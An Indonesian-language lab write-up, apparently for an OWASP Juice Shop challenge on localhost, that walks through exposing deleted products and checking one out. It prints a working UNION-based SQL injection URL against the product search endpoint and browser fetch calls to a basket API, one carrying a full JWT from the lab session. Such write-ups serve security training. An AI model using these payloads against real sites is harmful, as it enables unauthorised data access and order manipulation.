## Challenge 5: Christmas Special

### 1. [Soal]

Tantangan ini mengharuskan kita untuk menemukan produk yang tidak tersedia (telah dihapus), memasukkannya ke dalam keranjang belanja, dan melakukan checkout. Proses ini tidak dapat dilakukan melalui antarmuka pengguna normal karena produk tersebut disembunyikan dan tombol "Add to basket" dinonaktifkan.

### 2. [Link resource untuk latihan.]

`http://127.0.0.1:3000/`

### 3. Jawaban + bukti

#### Step-by-step yang sudah dicoba

1.  **Identifikasi Titik Injeksi:** Titik injeksi SQL diidentifikasi pada endpoint API pencarian produk: `/rest/products/search`. Input dari parameter `q` rentan terhadap injeksi.

2.  **Menemukan Produk Tersembunyi:** Sebuah payload SQL Injection berbasis `UNION` dibuat untuk secara spesifik mencari produk yang telah di-*soft delete* (memiliki entri di kolom `deletedAt`).
    -   **Payload URL:**
        ```http
        http://127.0.0.1:3000/rest/products/search?q=test')) UNION SELECT * FROM Products WHERE deletedAt IS NOT NULL--
        ```
    -   Dengan mengakses URL ini di browser, server mengembalikan data JSON mentah yang berisi detail produk yang telah dihapus. Dari data ini, ditemukan produk "Christmas Surprise Box" dengan `ProductId: 10`.

3.  **Analisis Mekanisme Penambahan Keranjang:** Tombol "Add to basket" di frontend dinonaktifkan. Solusinya adalah dengan memanggil API `/api/BasketItems/` secara manual untuk menambahkan produk.

4.  **Mengumpulkan Informasi untuk API Call:** Untuk memanggil API, dibutuhkan tiga informasi:
    -   **ProductId:** Sudah ditemukan, yaitu `10`.
    -   **BasketId (bid):** Ditemukan di `Developer Tools > Application > Session Storage`. Nilainya adalah `3`.
    -   **Authorization Token:** Awalnya diabaikan, yang menyebabkan kegagalan. Token ditemukan di `Developer Tools > Application > Local Storage`.

5.  **Percobaan API Call (Gagal):** Percobaan pertama menggunakan `fetch` di browser console gagal.
    -   **Kode Gagal:**
        ```javascript
        fetch('/api/BasketItems/', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({ ProductId: 10, BasketId: "3", quantity: 1 })
        });
        ```
    -   **Hasil:** Server merespons dengan `401 Unauthorized`.

6.  **Percobaan API Call (Berhasil):** Permintaan `fetch` diulang dengan menambahkan `Authorization` header yang berisi token yang ditemukan di Langkah 4.
    -   **Kode Berhasil:**
        ```javascript
        fetch('/api/BasketItems/', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MywidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImJlbmRlckBqdWljZS1zaC5vcCIsInBhc3N3b3JkIjoiMGMzNmU1MTdlM2ZhOTVhYWJmMWJiZmZjNjc0NGE0ZWYiLCJyb2xlIjoiY3VzdG9tZXIiLCJkZWx1eGVUb2tlbiI6IiIsImxhc3RMb2dpbklwIjoiIiwicHJvZmlsZUltYWdlIjoiYXNzZXRzL3B1YmxpYy9pbWFnZXMvdXBsb2Fkcy9kZWZhdWx0LnN2ZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyNS0wOS0wNCAwNzo1NjoxNy40NDIgKzAwOjAwIiwidXBkYXRlZEF0IjoiMjAyNS0wOS0wNCAwNzo1NjoxNy40NDIgKzAwOjAwIiwiZGVsZXRlZEF0IjpudWxsfSwiaWF0IjoxNzU2OTc4NTI1fQ.ykQ8AgvPVdcJK9pZhEmYnaXZIq1NjSlfauq7UO0v7vLZCM4W8duorc01KqCraeGT96zn7h06-CN6hyKT3lUySD9oWzgxmxsCSY9JI8htC1c4vR0usLjaDrHyM1oEpJ15QR7cHSJBP8pyBIfQ1zG5-xodK1OKkXZLV7EtY3hKdIs'
            },
            body: JSON.stringify({
                ProductId: 10,
                BasketId: "3",
                quantity: 1
            })
        });
        ```

7.  **Finalisasi:** Setelah perintah berhasil, produk muncul di keranjang belanja. Melanjutkan ke checkout menyelesaikan tantangan.

#### Bukti Screenshot

<img width="1894" height="1060" alt="Screenshot 2025-09-04 172709" src="https://github.com/user-attachments/assets/07b9aec0-4695-4faf-aa38-e8a53a190baa" />


<img width="1889" height="1064" alt="Screenshot 2025-09-04 174145" src="https://github.com/user-attachments/assets/c4a5c707-03c3-4738-b702-b34f6eaf3a33" />


<img width="1919" height="1068" alt="Screenshot 2025-09-04 174005" src="https://github.com/user-attachments/assets/0a2af2dc-1920-4d99-807f-5560f869b260" />


<img width="1904" height="1039" alt="Screenshot 2025-09-04 173936" src="https://github.com/user-attachments/assets/16546949-a1c3-41a6-9caf-eb55d897a906" />


<img width="1903" height="1058" alt="Screenshot 2025-09-04 173557" src="https://github.com/user-attachments/assets/5185cac0-703e-4d8e-b1cb-c776a91ea493" />


<img width="560" height="221" alt="Screenshot 2025-09-04 173201" src="https://github.com/user-attachments/assets/acd5d7db-8f54-4bed-be44-de262887526c" />


<img width="1915" height="1052" alt="Screenshot 2025-09-04 172926" src="https://github.com/user-attachments/assets/8c21a783-110a-4446-88d7-a3426cfba8f3" />

#### Catatan hasil percobaan

-   **Berhasil/Gagal:** Awalnya gagal karena error `401 Unauthorized`, kemudian berhasil setelah token otentikasi ditambahkan ke header permintaan.
-   **Alasan:** Aplikasi modern mengamankan endpoint API dengan token JWT (*JSON Web Token*) untuk memverifikasi identitas pengguna. Panggilan API langsung dari konsol tidak secara otomatis menyertakan token ini, sehingga harus ditambahkan secara manual.
